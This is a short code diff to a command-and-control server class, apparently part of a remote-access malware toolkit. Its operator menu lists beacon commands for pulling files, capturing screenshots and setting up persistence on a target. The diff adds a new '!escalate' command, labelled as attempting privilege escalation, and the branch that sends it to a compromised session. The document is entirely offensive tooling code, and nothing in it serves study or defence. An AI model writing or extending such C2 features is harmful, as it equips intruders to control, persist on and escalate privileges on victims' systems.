@@ -343,6 +343,7 @@ class C2Server:
         print("  !upload [remote]     - Get file from beacon")
         print("  !screenshot          - Capture and download screenshot")
         print("  !persist             - Establish persistence on target")
+        print("  !escalate            - Attempt privilege escalation")
 
         while True:   #infinite loop for continuous command input
             try:
@@ -384,6 +385,11 @@ class C2Server:
                 elif command == '!sysinfo':
                     # Send system info command
                     self.send_command(session_id, "!sysinfo")
+                    time.sleep(1)
+                    continue
+                elif command == '!escalate':
+                    # Priv esc
+                    self.send_command(session_id, "!escalate")
                     time.sleep(1)
                     continue
                 elif command.startswith('!'):
